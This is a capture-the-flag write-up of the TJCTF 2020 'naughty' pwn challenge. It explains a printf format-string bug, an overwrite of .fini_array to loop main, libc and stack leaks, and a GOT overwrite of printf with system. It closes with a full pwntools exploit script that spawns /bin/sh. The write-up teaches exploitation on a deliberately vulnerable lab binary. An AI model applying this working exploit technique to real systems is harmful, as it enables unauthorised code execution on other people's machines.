# Naught PWN TJCTF 2020 - Writeup by saimyguy 



This writeup assumes:

- You understand basic binary protections
- You understand basic format string exploits



Initially, I checked the permissions to get a feel for what type of binary I'm dealing with

```bash
$ checksec ./naughty
[*] '/home/kali/Desktop/CTF/tjctf20/naughty_chall/naughty'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```



## Write / Read Primitive



Ok, so opening up the binary in Ghidra, I can see its not stripped and it has a main function. The decompilation of the main function is as such...

```c
/* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */

undefined4 main(void)

{
    undefined4 uVar1;
    int in_GS_OFFSET;
    char local_114 [256];
    int local_14;
    undefined *local_10;
    
    local_10 = &stack0x00000004;
    local_14 = *(int *)(in_GS_OFFSET + 0x14);
    puts(...); // Banner
    puts("What is your name?");
    fflush(stdout);
    fgets(local_114,0x100,stdin);
    printf("You are on the NAUGHTY LIST ");
    printf(local_114);
    uVar1 = 0;
    if (local_14 != *(int *)(in_GS_OFFSET + 0x14)) {
        uVar1 = __stack_chk_fail_local();
    }
    return uVar1;
}
```



Looks like we already have our vulnerability in 

```c
fgets(local_114, 0x100, stdin);
...
printf(local_114);
```

0x100 = 256 bytes, so we don't have a buffer overflow. However, we do have a format string exploit - where we can leak information from the stack and also have our write **and** read primitive from this exploit. 



## The problem

If you're familiar with normal format string exploits, you'll probably be used to overwriting a **Global Offset Table** entry. This is indeed possible, as we noticed earlier that the binary was compiled with:

```
    RELRO:    No RELRO
```



However, the problem persists **what** and **where** are you going to write? You don't have any functions other than **__stack_chk_fail()** that are after the format string. 



## The .fini_array

There exists a portion of the binary, which is executed **after** returning from the main function, this is done by the **__libc_start_main+248** function on **exit** (I'm not 100% on the exact detail and more information can be found at [https://docs.oracle.com/cd/E19683-01/817-1983/6mhm6r4es/index.html](https://docs.oracle.com/cd/E19683-01/817-1983/6mhm6r4es/index.html)). 

Looking at the binary segments, you can see that the .fini_array does indeed exist and you have 4 bytes of space.

```bash
$ readelf -S ./naughty 
There are 30 section headers, starting at offset 0x14e0:

Section Headers:
  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
  [ 0]                   NULL            00000000 000000 000000 00      0   0  0
  [ 1] .interp           PROGBITS        08048134 000134 000013 00   A  0   0  1
  [ 2] .note.ABI-tag     NOTE            08048148 000148 000020 00   A  0   0  4
  [ 3] .note.gnu.build-i NOTE            08048168 000168 000024 00   A  0   0  4
  [ 4] .gnu.hash         GNU_HASH        0804818c 00018c 000020 04   A  5   0  4
  [ 5] .dynsym           DYNSYM          080481ac 0001ac 0000b0 10   A  6   1  4
  [ 6] .dynstr           STRTAB          0804825c 00025c 000086 00   A  0   0  1
  [ 7] .gnu.version      VERSYM          080482e2 0002e2 000016 02   A  5   0  2
  [ 8] .gnu.version_r    VERNEED         080482f8 0002f8 000030 00   A  6   1  4
  [ 9] .rel.dyn          REL             08048328 000328 000018 08   A  5   0  4
  [10] .rel.plt          REL             08048340 000340 000030 08  AI  5  23  4
  [11] .init             PROGBITS        08048370 000370 000023 00  AX  0   0  4
  [12] .plt              PROGBITS        080483a0 0003a0 000070 04  AX  0   0 16
  [13] .plt.got          PROGBITS        08048410 000410 000008 08  AX  0   0  8
  [14] .text             PROGBITS        08048420 000420 0002c4 00  AX  0   0 16
  [15] .fini             PROGBITS        080486e4 0006e4 000014 00  AX  0   0  4
  [16] .rodata           PROGBITS        080486f8 0006f8 000350 00   A  0   0  4
  [17] .eh_frame_hdr     PROGBITS        08048a48 000a48 000044 00   A  0   0  4
  [18] .eh_frame         PROGBITS        08048a8c 000a8c 00011c 00   A  0   0  4
  [19] .init_array       INIT_ARRAY      08049ba8 000ba8 000004 04  WA  0   0  4
  [20] .fini_array       FINI_ARRAY      08049bac 000bac 000004 04  WA  0   0  4
  [21] .dynamic          DYNAMIC         08049bb0 000bb0 0000e8 08  WA  6   0  4
  [22] .got              PROGBITS        08049c98 000c98 00000c 04  WA  0   0  4
  [23] .got.plt          PROGBITS        08049ca4 000ca4 000024 04  WA  0   0  4
  [24] .data             PROGBITS        08049cc8 000cc8 000008 00  WA  0   0  4
  [25] .bss              NOBITS          08049cd0 000cd0 000004 00  WA  0   0  1
  [26] .comment          PROGBITS        00000000 000cd0 000029 01  MS  0   0  1
  [27] .symtab           SYMTAB          00000000 000cfc 000470 10     28  44  4
  [28] .strtab           STRTAB          00000000 00116c 00026f 00      0   0  1
  [29] .shstrtab         STRTAB          00000000 0013db 000105 00      0   0  1
Key to Flags:
  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),
  L (link order), O (extra OS processing required), G (group), T (TLS),
  C (compressed), x (unknown), o (OS specific), E (exclude),
  p (processor specific)

```



The way the .fini_array works is that it holds some functions that must be executed on program finish. Since the array is only 4 bytes (one function), we don't actually need to worry about the order in which they are executed.



## Developing a Solution

So **how** do we exploit this? Well, what if we wrote the address of main to the .fini_array? We could loop around and restart the program! 

Why would we want to do this? Think about what you will need to do in order to pop a shell. Typical exploits want to call system and pass a pointer to "/bin/sh" as the argument. We can notice that there is a more than suitable candidate to overwrite in the **Global Offset Table**:

```c
    printf(local_114);
```

So, what if we overwrote the entry for printf with system, we could now pass in our input to **system()** and execute **ANY** command on the system! Unfortunately, there are two problems with this solution. As I mentioned earlier, if you overwrote printf, you wouldn't be able to call system because the program just ... well it just exits. Therefore, looping back to main would allow the, now overwritten, printf to instead call system and boom you win! 

The second problem lies in the fact that you don't know where system is, so you can't overwrite  printf to system. Looking for linked symbols of system, in the **Procedure Linkage Table** and **Symbols** yields no results:

```bash
$ readelf -s ./naughty  | grep system
< no output :( >
$ readelf -a ./naughty  | grep system
< no output :( >
```

Therefore we're presented with problem 2: how the hell can we get system? Well, if you've done ROP challenges or other types of PWN challenges, you may be familiar with leaking a LIBC address. 

Did you notice PIE was disabled? This wouldn't have mattered much because we would have been able to leak it anyway with out read primitive, but notice how **ASLR** is usually enabled on LIBC, so we have to first leak an address inside of LIBC and then calculate the base address of LIBC. This means that once you know which LIBC binary they are using, you can calculate the offset yourself and boom! You have a system pointer!! 

We can find offsets by doing

```bash
$ ldd ./naughty 
        linux-gate.so.1 (0xf7f5d000)
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7d4f000)
        /lib/ld-linux.so.2 (0xf7f5f000)
        
$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
  ...
  1533: 00044630    55 FUNC    WEAK   DEFAULT   14 system@@GLIBC_2.0
 
# This gives us the offset 0x44630
```

Yet another problem arises: you can only calculate the libc pointer **after** leaking it. This means that you will essentially waste the first run of the binary with just leaking a libc address. This is no bueno as we currently **have** to call system on the second run and cannot do so as we cannot overwrite system on the first run without knowing it's pointer.  

So how can we loop yet again? Once .fini_array is finished executing, you cannot re-execute the function inside. Any ideas ... ?

Lets control the return pointer on the stack! Doing so, we can overwrite the return pointer (yet again) to main allowing us to loop one final time (or however many times you need to). Now how do we get the return pointer? Leak it with our read primitive of course! 



Ok lets put everything together now.

### Stage 1:

- Leak a libc address and also leak a stack address
- Calculate both the libc base address and the stack address which holds the return pointer 
- Overwrite the .fini_array entry with the address of main

### Stage 2:

- Use the leaks to overwrite the **GOT** entry of printf with the libc address of system 
- **At the SAME time** overwrite the stack address that holds the return address 

### Stage 3

- Now you can just type "/bin/sh" and if all goes well, system("/bin/sh") gets executed! :D 



### Proof Of Concept:

Some notes about my crappy exploit - its crappy and only works in remote bc I had to break it locally. Also its more unstable than Boris Johnson's government, run it like 3 times in remote mode to get it to work :D.  

```python
#!/usr/bin/env python3
from pwn import *
from sys import argv

REMOTE = 0
if len(argv) > 1:
    if 'r' in argv[1]:
        REMOTE = 1

context.terminal = ['tmux', 'splitw']
exe = './naughty'
host, port = "p1.tjctf.org", 8004

# The non-remote version of this exploit is broken
# The exploit is too unstable for me to bother fixing that
# You also need to run the remote version like 3 times until u pop shell
proc = remote(host, port) if REMOTE else process(exe)

# Testing breakpoints 
# Checking ret address, and checking when the format
# string gets written
if len(argv) > 1:
    if 'd' in argv[1]:
        DEBUG = 1
        gdb.attach(proc, '''
b *main
b *main+249
b *main+288
c
''')

# GAME PLAN:
# STAGE 1
# overwrite fini_array -> main
# leak libc address
# STAGE 2 
# calculate base and then system
# overwrite printf@GOT -> system@libc
# overwrite fini_array -> main (again)
# STAGE 3
# input /bin/sh
# STAGE 4
# PROFIT?????

# addresses
main        = 0x08048536
fini_array  = 0x08049bac
printf_got  = 0x08049cb0

log.info("Fini_array    0x%x" % fini_array)
log.info("main          0x%x" % main)

# STAGE 1 - Overwrite fini_array with main
lower_main = main & 0xffff
upper_main = main >> 16
                                                                    
payload  = p32(fini_array+2)
payload += p32(fini_array)
payload += b"|%75$ x|"
payload += b"|%35$ x|"
payload += bytes("%{}x".format(upper_main - 8 - 20).encode('utf-8'))
payload += b"%7$ hn"
payload += bytes("%{}x".format(lower_main - upper_main).encode('utf-8'))
payload += b"%8$ hn"
log.info("Payload: %s" % payload)

proc.recv()
proc.sendline(payload)
data = proc.recv()
leak = data.split(b'|')
if REMOTE:
    libc = int(leak[1],16) - 0xf1 - 0x18d90
else:
    libc = int(leak[1],16) - 0xf1 - 0x18d90
        
stack = int(leak[3], 16)
stack += 64 - 0xe0
log.info("Leaked:       0x%x" % (int(leak[1],16) - 0xf1))
log.info("Libc base:    0x%x" % libc)
log.info("return add:   0x%x" % stack)

# STAGE 2 - Overwrite printf with system AND fini_array with main yet again
if REMOTE:
    system_offset = 0x3cd10
else:
    system_offset = 0x3d200

system = libc + system_offset
lower_system = system & 0xffff
upper_system = system >> 16
log.info("System        0x%x" % system)

# This payload assumes that the addresses are in the format 
# (just look at comparable size of half words)
# system = 0xffff 5555
# main   = 0x0804 8536
payload  = p32(stack+2)     # upper (return addy) <- upper_main
payload += p32(stack)       # lower (return addy) <- lower_main
payload += p32(printf_got)  # lower (printf@GOT)  <- lower_system
payload += p32(printf_got+2)# upper (printf@GOT)  <- upper_system

# Format string specifiers, with calculated padding
# The padding / order of these specifiers is entirely dependant on 
# the structure of the addresses that you need to write
payload += bytes("%{}x".format(upper_main - 16).encode('utf-8'))
payload += b"%7$ hn"
payload += bytes("%{}x".format(lower_system - upper_main).encode('utf-8'))
payload += b"%9$ hn"
payload += bytes("%{}x".format(lower_main - lower_system).encode('utf-8'))
payload += b"%8$ hn"
payload += bytes("%{}x".format(upper_system + 0x7778 + 0x352).encode('utf-8'))
payload += b"%10$ hn"

log.info("Payload2: %s" % payload)
proc.recv()
proc.sendline(payload)
proc.recv()

# Execute system(ptr_to_user_input)
proc.sendline("/bin/sh")
proc.interactive()
```
